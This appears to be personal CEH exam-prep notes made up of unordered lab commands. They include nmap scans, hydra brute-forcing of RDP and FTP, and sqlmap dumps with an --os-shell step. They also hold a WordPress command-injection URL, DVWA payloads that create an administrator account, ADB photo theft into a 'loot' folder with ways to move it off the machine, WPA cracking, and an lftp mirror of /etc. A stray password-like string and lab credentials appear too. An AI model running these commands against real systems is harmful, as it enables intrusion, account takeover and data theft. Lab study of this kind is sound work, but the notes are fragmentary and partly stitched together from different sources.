# CEH

zta8REQ3cpc!weu6tjk

Stealth - nmap -sS -v [Target IP Address]
Xmas - nmap -sX -v [Target IP Address]
Maimon - nmap -sM -v [Target IP Address]
ACK - nmap -sA -v [Target IP Address]     (no response filtered = firewall)
UDP - nmap -sU -v [Target IP Address]
NULL - nmap -sN -T4 -A -v [Target IP Address]

mysql
nmap -p 3306 10.10.1.0/24
nmap -sV -p 0-65535 10.10.1.19   = service versions


Product Version/FQDN/DNS CN
nmap -p 389 10.10.1.0/24
nmap -A 10.10.1.22

Android
python3 -m pip install colorama
python3 phonesploitpro.py
nmap -p 5555 10.10.1.0/24
Phonesploit 10.10.1.14
Get shell
Navigate /sdcard/Downloads
ls
pull /sdcard/Downloads
open image file

RDP (remmina)
nmap -p 3389 10.10.1.0/24
Remote Desktop Connection
Windows Explorer Search

Cryptoforge
HashCalc

snow
cyberchef base64 encode  
open cmd in snow folder
snow -C -m "base64 encoded output" -p "password" restricted.txt restricted2.txt
snow -C -p "password" restricted2.txt
cyberchef base64 decode

log4j-shell-poc
nmap -p 22 10.10.1.0/24
ssh ubuntu@10.10.1.9
toor
find log4j-shell-poc folder
cat requirements.txt

OpenVAS
docker run -d -p 443:443 –-name openvas mikesplain/openvas
127.0.0.1

WordPress
https://wpscan.com/  (hackscuseme@proton.me - Phan)
wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token 
curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' 
nt authority\ \system

RDP (remmina)
nmap -p  21, 139, 3389 10.10.1.0/24
hydra -L Usernames.txt -P Passwords.txt 10.10.1.11 rdp
RDP 10.10.1.11
Search for CEH-Tools

Map Windows drive in ParrotOS
smbclient \\\\10.10.1.11\\CEH-Tools -U username

IPV4 packet counts
Wireshark -> Statistics -> Conversations -> IPv4 -> Sort by Packets

aircrack-ng -w password.txt W!F!_Pcap.cap


SQLmap
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#8]" --dbs 


DVWA
Login to http://10.10.1.22:8080/DVWA
admin / password
Set Security to low
| dir directory
| type file name

Linux privilege escalation
nmap -p 22 10.10.1.0/24
ssh ubuntu@10.10.1.9
toor
cd /
cat

ELF & DIE
Detect It Easy
load file
Hash button
PT_LOAD(0)


SQL Injection
Parrot Firefox login to website
Developer tools copy cookie
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --dbs
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D moviescope --tables
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value ]" -D moviescope -T User_Login --dump
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value ]" -D moviescope -T User_Login --os-shell


https://crackstation.net

https://gchq.github.io/CyberChef/

nmap.org/download.html

Capture Machine
Bevywise_MQTTRoute_Win_64.exe

Generator Machine
C:\Bevywise\IotSimulator\bin directory and double-click on the runsimulator.bat
URL http://127.0.0.1:9000/setnetwork?network=HEALTH_CARE
Create New Network popup appears. Type any name (here, CEH_FINANCE_NETWORK)
Set the Broker IP Address as 10.10.1.19 (the IP address of the Windows Server 2019 )
Create New Device
Subscribe for command - TS1 popup opens. Select On start under the Subscribe on tab, type High_Tempe under the Topic
tab, and select 1 Atleast once below the Qos option. Click on Save.
switch back - start wireshark
switch back - type http://localhost:8080
send high temp message


hostname -I

Domain Controller 389
Windows web dev env 3306
RDP RAT 3389
Android ADB 5555

sqlmap -u "http://www.moviescope.com" --crawl=2 --dump-format=CSV --dump

sqlmap -u "http://www.moviescope.com" --crawl=2
# accept defaults

ls ~/.local/share/sqlmap/output/www.moviescope.com/
cat ~/.local/share/sqlmap/output/www.moviescope.com/*.csv

nmap -p 20,21,22,139,445,3389 <target>

get remote_file local_file
mget -R remotefolder/*
wget -m ftp://user:pass@host/remotefolder/

On ParrotOS, lftp is installed or available via apt install lftp. It supports recursive downloads:

lftp ftp://user:pass@victim-ip
mirror /etc configs_backup

aircrack-ng handshake.cap -w rockyou.txt
aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt
'/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'

# ADB equivalent:
adb -s 192.168.1.50:5555 pull /sdcard/DCIM/Camera ./loot/192.168.1.50/Camera

On Windows 11, enable OpenSSH Server (Settings → Optional Features → Add a feature)

scp -r ./loot/192.168.1.50/Camera YourWinUser@192.168.1.20:/Users/YourWinUser/Desktop/loot/

sudo apt install -y cifs-utils
sudo mkdir -p /mnt/winshare
sudo mount -t cifs //192.168.1.20/dropbox /mnt/winshare -o username=YourWinUser,domain=WORKGROUP
cp -r ./loot/192.168.1.50/Camera /mnt/winshare/
sudo umount /mnt/winshare

cd ./loot/192.168.1.50
python3 -m http.server 8000
On Windows, open a browser to http://<ParrotOS-IP>:8000/ and download the folder/files.

hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11]. 

hydra -l Administrator -P passwords.txt rdp://10.10.1.11 -t 4 -f -V

docker run -d -p 443:443 –-name openvas mikesplain/openvas command to launch OpenVAS.


Now, the data (“My Swiss bank account number is 45656684512263”) is hidden inside the readme2.txt file with the contents
of readme.txt.
9. The file readme2.txt has become a combination of readme.txt + My Swiss bank account number is 45656684512263.
10. Now, type snow -C -p "magic" readme2.txt. It will show the content of readme.txt (the password is magic, which was entered
while hiding the data in Step 7).

type https://stegonline.georgeom.net/upload

type http://10.10.1.22:8080/dvwa/login.php and press Enter
3. The DVWA login page appears; type the Username and Password as gordonb and abc123.

| dir c:\wamp64\www\DVWA\
| type c:\wamp64\www\DVWA\file.txt
| tasklist
| whoami
| Taskkill /PID [Process ID value of the desired process] /F
| net user Test /Add
| net user
| net localgroup Administrators Test /Add

VeraCrypt
Create Volume
Create an encrypted file container radio-button is selected and click Next to proceed.
Defaults
Volume Location wizard, click Select File....
Specify Path and File Name window appears; navigate to the desired location (here, Desktop), provide the File name as MyVolume, and click Save.
After saving the file, the location of a file containing the VeraCrypt volume appears under the Volume Location field; then, click Next.
In the Encryption Options wizard, keep the default settings and click Next.
In the Volume Size wizard, ensure that the MB radio-button is selected and specify the size of the VeraCrypt container as 5; then, click Next.
The Volume Password wizard appears; provide a strong password in the Password field, retype in the Confirm field, and click Next. The password provided in this lab is qwerty@123.
A VeraCrypt Volume Creation Wizard warning pop-up appears; then, click Yes.
12. The Volume Format wizard appears; ensure that FAT is selected in the Filesystem option and Default is selected
in Cluster option.
13. Check the checkbox under the Random Pool, Header Key, and Master Key section.
14. Move your mouse as randomly as possible within the Volume Creation Wizard window for at least 30 seconds and click
the Format button.
After clicking Format, VeraCrypt will create a file called MyVolume in the provided folder. This file depends on the VeraCrypt
container (it will contain the encrypted VeraCrypt volume).
16. Depending on the size of the volume, volume creation may take some time.
17. Once the volume is created, a VeraCrypt Volume Creation Wizard dialog-box appears; click OK.
The VeraCrypt main window appears; select a drive (here, I:) and click Select File....
The Select a VeraCrypt Volume window appears; navigate to Desktop, click MyVolume, and click Open.
The window closes, and the VeraCrypt window appears displaying the location of selected volume under the Volume field; then, click Mount.
The Enter password dialog-box appears; type the password you specified in Step#11 into the Password field and click OK.
The password specified in this task is qwerty@123.
After the password is verified, VeraCrypt will mount the volume in I: drive, as shown in the screenshot
MyVolume has successfully mounted the container as a virtual disk (I:). The virtual disk is entirely encrypted (including file
names, allocation tables, free space, etc.) and behaves similarly to a real disk. You can copy or move files to this virtual disk to encrypt them.
25. Create a text file on Desktop and name it Test. Open the text file and insert text.
26. Click File in the menu bar and click Save.






